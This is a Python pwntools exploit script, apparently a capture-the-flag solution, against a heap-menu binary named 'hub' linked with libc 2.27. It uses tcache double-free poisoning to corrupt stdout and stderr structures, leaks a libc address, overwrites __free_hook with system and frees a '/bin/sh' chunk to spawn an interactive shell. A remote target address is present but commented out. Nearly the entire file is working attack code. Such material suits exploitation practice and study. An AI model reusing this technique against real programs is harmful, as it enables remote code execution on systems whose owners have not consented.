#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './hub_2bcab892e2e5b54edbef4ccecd6f373f'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('47.112.139.218', 13132)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    b *0x400A33
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Malloc(size):
    sh.sendlineafter('>>', '1')
    sh.sendlineafter('How long will you stay?\n', str(size))

def Free(hub):
    sh.sendlineafter('>>', '2aaaaaaaa')
    sh.sendlineafter('Which hub don\'t you want?', str(hub))

def Write(content):
    sh.sendlineafter('>>', '3')
    sh.sendafter('What do you want?\n', content)


Malloc(0x18)
Free(0)
Free(0)
Malloc(0x18)
Write(p64(elf.symbols['stdout']))
Malloc(0x18)
Malloc(0x18)
Malloc(0x18)
Write(p64(0xfbad2887 + 0x1000))

Malloc(0x28)
Free(0)
Free(0)
Malloc(0x28)
Write(p64(elf.symbols['stderr']))
Malloc(0x28)
Malloc(0x28)
Write(p16(0x0780))

Malloc(0x38)
Free(0)
Free(0)
Malloc(0x38)
Write(p64(elf.symbols['stderr']))
Malloc(0x38)
Malloc(0x38)
Malloc(0x38)
Write(p8(0xc8))

result = sh.recvn(8)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))

Malloc(0x48)
Free(0)
Free(0)
Malloc(0x48)
Write(p64(libc_addr + libc.symbols['__free_hook']))
Malloc(0x48)
Malloc(0x48)
Write(p64(libc_addr + libc.symbols['system']))

Malloc(0x58)
Write('/bin/sh\0')
Free(0)

sh.interactive()
clear()